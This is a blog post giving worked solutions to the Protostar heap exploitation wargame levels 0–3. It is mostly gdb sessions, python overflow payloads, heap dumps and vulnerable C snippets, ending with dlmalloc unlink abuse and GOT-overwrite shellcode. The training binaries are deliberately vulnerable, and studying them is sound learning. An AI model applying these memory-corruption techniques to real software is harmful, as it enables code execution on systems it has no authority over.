
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>Protostar solutions - Heap Exploitation - </title>
  <meta name="author" content="Bryan Alexander">

  
  <meta name="description" content="And we&rsquo;re back with Protostar, this time working on the heap section. Heap Exploits 0 Introductory level that demonstrates overflowing heap &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://hatRiot.github.io/blog/2014/09/21/protostar-heap-exploits">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
  

</head>

<body   class="collapse-sidebar sidebar-footer" >
  <!--<header role="banner"><hgroup>
  <h1><a href="/"></a></h1>
  
</hgroup>

</header>-->
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:hatRiot.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Home</a></li>
  <li><a href="/about">About</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">Protostar Solutions - Heap Exploitation</h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-09-21T14:10:04-07:00" pubdate data-updated="true">Sep 21<span>st</span>, 2014</time>
        
      </p>
    
  </header>


<div class="entry-content"><p>And we&rsquo;re back with Protostar, this time working on the heap section.</p>

<h2>Heap Exploits 0</h2>

<p>Introductory level that demonstrates overflowing heap structures.  It&rsquo;s pretty simple:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ objdump -dt heap0 | grep winner
</span><span class='line'>08048464 g     F .text  00000014              winner
</span><span class='line'>08048478 g     F .text  00000014              nowinner
</span><span class='line'>08048464 &lt;winner&gt;:
</span><span class='line'>08048478 &lt;nowinner&gt;:</span></code></pre></td></tr></table></div></figure>


<p>And then we find our EIP offset:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*72 + "B"*4')
</span><span class='line'>Starting program: /opt/protostar/bin/heap0 $(python -c 'print "A"*72 + "B"*4')
</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x42424242 in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>Using our mad exploit skills:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./heap0 $(python -c 'print "A"*72 + "\x64\x84\x04\x08"')
</span><span class='line'>data is at 0x804a008, fp is at 0x804a050
</span><span class='line'>level passed</span></code></pre></td></tr></table></div></figure>


<h2>Heap Exploits 1</h2>

<p>This challenge dives a bit more into heap exploitation with a nice write-what-where, and the goal is to redirect execution flow to the function <code>winner</code>.  Let&rsquo;s find that first:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ objdump -dt heap1 | grep winner
</span><span class='line'>08048494 g     F .text  00000025              winner</span></code></pre></td></tr></table></div></figure>


<p>Now let&rsquo;s check out the actual bug:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*20 + "B"*4') xx
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? (y or n) y
</span><span class='line'>Starting program: /opt/protostar/bin/heap1 $(python -c 'print "A"*20 + "B"*4') xx
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>*__GI_strcpy (dest=0x42424242 &lt;Address 0x42424242 out of bounds&gt;, src=0xbffff9a3 "xx") at strcpy.c:40
</span><span class='line'>40  strcpy.c: No such file or directory.
</span><span class='line'>    in strcpy.c</span></code></pre></td></tr></table></div></figure>


<p>As we can see, we control the source (argument two) and the destination, address one, which is the result of a pointer overflow in the following code:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>strcpy(i1-&gt;name, argv[1]);
</span><span class='line'>strcpy(i2-&gt;name, argv[2]);</span></code></pre></td></tr></table></div></figure>


<p>We have a couple of options for exploitation, but I chose to simply overwrite ebp+4 to take control over the return address.  Let&rsquo;s find that first:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) b *0x08048566
</span><span class='line'>Breakpoint 1 at 0x8048566: file heap1/heap1.c, line 35.
</span><span class='line'>(gdb) r xx yy
</span><span class='line'>Starting program: /opt/protostar/bin/heap1 xx yy
</span><span class='line'>and that's a wrap folks!
</span><span class='line'>
</span><span class='line'>Breakpoint 1, main (argc=3, argv=0xbffff864) at heap1/heap1.c:35
</span><span class='line'>35  heap1/heap1.c: No such file or directory.
</span><span class='line'>    in heap1/heap1.c
</span><span class='line'>(gdb) x/wx $ebp
</span><span class='line'>0xbffff7b8: 0xbffff838</span></code></pre></td></tr></table></div></figure>


<p>This shows ebp is located at 0xbffff7b8, so let&rsquo;s overwrite that:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "B"*4')
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? (y or n) y
</span><span class='line'>Starting program: /opt/protostar/bin/heap1 $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "B"*4')
</span><span class='line'>and that's a wrap folks!
</span><span class='line'>
</span><span class='line'>Breakpoint 1, main (argc=0, argv=0xbffff844) at heap1/heap1.c:35
</span><span class='line'>35  in heap1/heap1.c
</span><span class='line'>(gdb) x/wx $ebp
</span><span class='line'>0xbffff798: 0x41414141
</span><span class='line'>(gdb) x/wx $ebp+4
</span><span class='line'>0xbffff79c: 0x42424242
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<p>Note that ebp&rsquo;s address changed; this is a stupid method and is susceptible to stack shifting, so we need to ensure we accomodate for that.  Anyway, now we can control where we return to, so let&rsquo;s pop in our winning address:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "\x94\x84\x04\x08"')
</span><span class='line'>
</span><span class='line'>Breakpoint 1, main (argc=0, argv=0xbffff844) at heap1/heap1.c:35
</span><span class='line'>35  in heap1/heap1.c
</span><span class='line'>(gdb) x/wx $ebp
</span><span class='line'>0xbffff798: 0x41414141
</span><span class='line'>(gdb) x/wx $ebp+4
</span><span class='line'>0xbffff79c: 0x08048494
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>and we have a winner @ 1410933753
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x00000000 in ?? ()
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<p>And that&rsquo;s all!  Notice we still segfault, this is because we&rsquo;ve totally screwed up the stack, and it&rsquo;s trying to pop another value off the stack and return there.  We can trivally fix that by appending the address for exit:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "\x94\x84\x04\x08" + "\xc0\x60\xec\xb7"')
</span><span class='line'>Starting program: /opt/protostar/bin/heap1 $(python -c 'print "A"*20 + "\x98\xf7\xff\xbf"') $(python -c 'print "A"*4 + "\x94\x84\x04\x08" + "\xc0\x60\xec\xb7"')
</span><span class='line'>and that's a wrap folks!
</span><span class='line'>and we have a winner @ 1410933890
</span><span class='line'>
</span><span class='line'>Program exited with code 0124.
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<h2>Heap Exploits 2</h2>

<p>This one is pretty simple, and doesn&rsquo;t require us to really exploit much.  What we have is basically a contrived authentication service that&rsquo;s got four commands: auth, reset, service, and login.  The goal is to trigger the &ldquo;you have logged in already!&rdquo; message.  Here&rsquo;s the solution:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/opt/protostar/bin$ ./heap2
</span><span class='line'>[ auth = (nil), service = (nil) ]
</span><span class='line'>auth xx
</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
</span><span class='line'>service xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]
</span><span class='line'>login
</span><span class='line'>you have logged in already!
</span><span class='line'>[ auth = 0x804c008, service = 0x804c018 ]</span></code></pre></td></tr></table></div></figure>


<p>First we auth, which allocates the auth structure:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if(strncmp(line, "auth ", 5) == 0) {
</span><span class='line'>  auth = malloc(sizeof(auth));
</span><span class='line'>  memset(auth, 0, sizeof(auth));
</span><span class='line'>  if(strlen(line + 5) &lt; 31) {
</span><span class='line'>    strcpy(auth-&gt;name, line + 5);
</span><span class='line'>  }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>Then we execute service with a long string:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if(strncmp(line, "service", 6) == 0) {
</span><span class='line'>      service = strdup(line + 7);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>strdup duplicates a string, allocated via malloc.  Note in the auth struct allocation that it&rsquo;s only allocating <code>sizeof(auth)</code>.  This is an incorrect allocation, as it&rsquo;s really just allocating memory for a struct <em>pointer</em>, and not the 30 odd bytes for the structure.  We can easily demonstrate this with multiple auth struct allocations:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./heap2
</span><span class='line'>[ auth = (nil), service = (nil) ]
</span><span class='line'>auth 1 
</span><span class='line'>[ auth = 0x804c008, service = (nil) ]
</span><span class='line'>auth 2
</span><span class='line'>[ auth = 0x804c018, service = (nil) ]</span></code></pre></td></tr></table></div></figure>


<p>This 16 byte difference is comprised solely of chunk headers.  All we need to do is set the auth flag in the struct to some non-zero value, which can be done with the service command and our arbitrarily long string allocation.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if(strncmp(line, "login", 5) == 0) {
</span><span class='line'>    if(auth-&gt;auth) {
</span><span class='line'>      printf("you have logged in already!\n");
</span><span class='line'>    } else {
</span><span class='line'>      printf("please enter your password\n");
</span><span class='line'>    }
</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>


<h2>Heap Exploits 3</h2>

<p>This is the level that I thought more of these would be; this level requires us to manipulate heap metadata in order to obtain code execution.  Whilst this method is terribly outdated and not applicable at all to modern heaps, it&rsquo;s still a blast, and many of the high level methods still apply.</p>

<p>I highly, highly recommend reading the essential <a href="http://phrack.org/issues/57/9.html"><em>Once Upon A Free()</em></a> if you&rsquo;re unfamiliar with old school, dlmalloc heap exploitation, as there is quite a bit of prerequisite knowledge necessary to complete this stage.  I&rsquo;ll assume the reader has a cursory understanding of how this process will go down.</p>

<p>Much like the previous stages, we need to redirect the program to another function, <code>winner</code>.  Stage 3 executes three separate, 32 byte malloc&rsquo;s, strcpy&rsquo;s our input into each chunk, then free&rsquo;s them in <a href="http://webcache.googleusercontent.com/search?q=cache:TddtBQ76DO4J:exploit-exercises.com/protostar/heap3+&amp;cd=11&amp;hl=en&amp;ct=clnk&amp;gl=us">reverse</a>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>a = malloc(32);
</span><span class='line'>b = malloc(32);
</span><span class='line'>c = malloc(32);
</span><span class='line'>
</span><span class='line'>strcpy(a, argv[1]);
</span><span class='line'>strcpy(b, argv[2]);
</span><span class='line'>strcpy(c, argv[3]);
</span><span class='line'>
</span><span class='line'>free(c);
</span><span class='line'>free(b);
</span><span class='line'>free(a);</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s first check out the memory layout.  After all three allocations and strcpy&rsquo;s, but before any free&rsquo;s:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/10wx 0x804c008-8
</span><span class='line'>0x804c000:  0x00000000  0x00000029  0x41414141  0x00000000
</span><span class='line'>0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804c020:  0x00000000  0x00000000
</span><span class='line'>(gdb) x/10wx 0x804c030-8
</span><span class='line'>0x804c028:  0x00000000  0x00000029  0x42424242  0x00000000
</span><span class='line'>0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804c048:  0x00000000  0x00000000
</span><span class='line'>(gdb) x/10wx 0x804c058-8
</span><span class='line'>0x804c050:  0x00000000  0x00000029  0x43434343  0x00000000
</span><span class='line'>0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804c070:  0x00000000  0x00000000
</span><span class='line'>(gdb)</span></code></pre></td></tr></table></div></figure>


<p>Recall that each chunk has metadata in-channel that allows dlmalloc to traverse, coalesce, and fetch chunks on the heap.  In the above case, three allocated chunks have two requisite fields: <code>prev_size</code> and <code>size</code>.  As none of the previous chunks in the heap have been free&rsquo;d, the<code>prev_size</code> field is 0x0.  The size field is 0x29, or 41.  The lower three bits are reserved in this field, so accounting for that:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) p/d 0x29 & ~3
</span><span class='line'>$1 = 40
</span><span class='line'>(gdb)      </span></code></pre></td></tr></table></div></figure>


<p>These three chunks are then free&rsquo;d in reverse order, starting from chunk c.  Exploitation for this rather straight forward, we just need to overflow adjacent metadata headers to craft an illicit chunk.  Once free enters its unlink macro, we obtain execution flow control.</p>

<p>We need to start by setting the <code>prev_size</code> and <code>size</code> fields to values that allow us to control forward and backward chunk pointers.  We begin by setting both fields to 0xffffffc, or -4.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*32 + "\xfc\xff\xff\xff"*2') BBBB CCCC
</span><span class='line'>Starting program: /opt/protostar/bin/heap3 $(python -c 'print "A"*32 + "\xfc\xff\xff\xff"*2') BBBB CCCC
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff824) at heap3/heap3.c:24
</span><span class='line'>24  in heap3/heap3.c
</span><span class='line'>(gdb) x/10wx 0x804c030-8
</span><span class='line'>0x804c028:  0xfffffffc  0xfffffffc  0x42424242  0x00000000
</span><span class='line'>0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804c048:  0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>


<p>We now shift to setting the flink and blink values, which are set once a chunk is freed.  Let&rsquo;s inspect these chunks after all three have been freed:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/10wx 0x804c008-8
</span><span class='line'>0x804c000:  0x00000000  0x00000029  0x0804c028  0x00000000
</span><span class='line'>0x804c010:  0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804c020:  0x00000000  0x00000000
</span><span class='line'>(gdb) x/10wx 0x804c030-8
</span><span class='line'>0x804c028:  0x00000000  0x00000029  0x0804c050  0x00000000
</span><span class='line'>0x804c038:  0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804c048:  0x00000000  0x00000000
</span><span class='line'>(gdb) x/10wx 0x804c058-8
</span><span class='line'>0x804c050:  0x00000000  0x00000029  0x00000000  0x00000000
</span><span class='line'>0x804c060:  0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0x804c070:  0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>


<p>The value after the <code>size</code> field is a forward pointer to the next free chunk.  There would typically be another pointer in the next field, a backwards link, however, dlmalloc employs what&rsquo;s known as fastbins.  This is a singly-linked list holding recently freed small chunks ( &lt; 64 bytes).  More on this can be found <a href="ftp://g.oswego.edu/pub/misc/malloc-2.7.0.c">here</a>.</p>

<p>Taking a quick peek at the exploitable unlink macro:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define unlink(P, BK, FD)
</span><span class='line'>{
</span><span class='line'>  BK = P-&gt;bk;
</span><span class='line'>  FD = P-&gt;fd;
</span><span class='line'>  FD-&gt;bk = BK;
</span><span class='line'>  BK-&gt;fd = FD;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>This macro will essentially update chunk pointers to, naturally, unlink a recently freed chunk.  This boils down to:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>*(next-&gt;fd + 12) = next-&gt;bk
</span><span class='line'>*(next-&gt;bk + 8) = next-&gt;fd</span></code></pre></td></tr></table></div></figure>


<p>A simple write-what-where.  If we set fd to <code>return address - 0xc</code>, or the where, then bk is the what and ends up being the value popped into EIP.  Let&rsquo;s test this out by attempting to write 0x42424242 into chunk A:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r $(python -c 'print "A"*32 + "\xfc\xff\xff\xff"*2') $(python -c 'print "B"*4 + "\xfc\xbf\x04\x08" + "B"*4') CCCC
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? (y or n) y
</span><span class='line'>Starting program: /opt/protostar/bin/heap3 $(python -c 'print "A"*32 + "\xfc\xff\xff\xff"*2') $(python -c 'print "B"*4 + "\xfc\xbf\x04\x08" + "B"*4') CCCC
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048911 in main (argc=4, argv=0xbffff814) at heap3/heap3.c:24
</span><span class='line'>24  in heap3/heap3.c
</span><span class='line'>(gdb) ni 3
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x08049906 in free (mem=0x804c030) at common/malloc.c:3638
</span><span class='line'>3638    common/malloc.c: No such file or directory.
</span><span class='line'>in common/malloc.c
</span><span class='line'>(gdb) x/10wx 0x804c008-8
</span><span class='line'>0x804c000:  0x00000000  0x00000029  0x42424242  0x41414141
</span><span class='line'>0x804c010:  0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0x804c020:  0x41414141  0x41414141
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<p>So we can write a controlled value somewhere.  We&rsquo;ll take the path of least resistance for exploitation and overwrite the GOT entry for puts with the location of our shellcode, which will be a simple jump to the appropriate function.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ objdump -t --dynamic-relo ./heap3 | grep puts
</span><span class='line'>0804b128 R_386_JUMP_SLOT   puts</span></code></pre></td></tr></table></div></figure>


<p>and winner:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) p winner
</span><span class='line'>$2 = {void (void)} 0x8048864 &lt;winner&gt;</span></code></pre></td></tr></table></div></figure>


<p>Since our return address needs to be at an offset of -0xc, we&rsquo;ll be using <code>0x804b11c</code> as the return address.  It is also worth noting that the first field of the chunk is clobbered during the free routine, so we&rsquo;ll need an offset of +4 there as well.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) r AAAA$(python -c 'print "A"*28 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\x41"*4 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? (y or n) y
</span><span class='line'>
</span><span class='line'>Starting program: /opt/protostar/bin/heap3 AAAA$(python -c 'print "A"*28 + "\xfc\xff\xff\xff" + "\xfc\xff\xff\xff"') $(python -c 'print "\x41"*4 + "\x1c\xb1\x04\x08" + "\x0c\xc0\x04\x08"') CCCC
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x08048935 in main (argc=4, argv=0xbffff814) at heap3/heap3.c:24
</span><span class='line'>24  heap3/heap3.c: No such file or directory.
</span><span class='line'>    in heap3/heap3.c
</span><span class='line'>(gdb) x/i $eip
</span><span class='line'>0x8048935 &lt;main+172&gt;:   call   0x8048790 &lt;puts@plt&gt;
</span><span class='line'>(gdb) si
</span><span class='line'>0x08048790 in puts@plt ()
</span><span class='line'>(gdb) x/i $eip
</span><span class='line'>0x8048790 &lt;puts@plt&gt;:   jmp    DWORD PTR ds:0x804b128
</span><span class='line'>(gdb) ni
</span><span class='line'>0x0804c00c in ?? ()
</span><span class='line'>(gdb) x/wx $eip
</span><span class='line'>0x804c00c:  0x41414141
</span><span class='line'>(gdb) </span></code></pre></td></tr></table></div></figure>


<p>This gives us about eight bytes until the clobbered field, but this is sufficient for our purposes.  Using metasm, we can generate shellcode for a simple <code>call winner</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>metasm &gt; push 0x08048864; ret
</span><span class='line'>"\x68\x64\x88\x04\x08\xc3"
</span><span class='line'>metasm &gt; </span></code></pre></td></tr></table></div></figure>




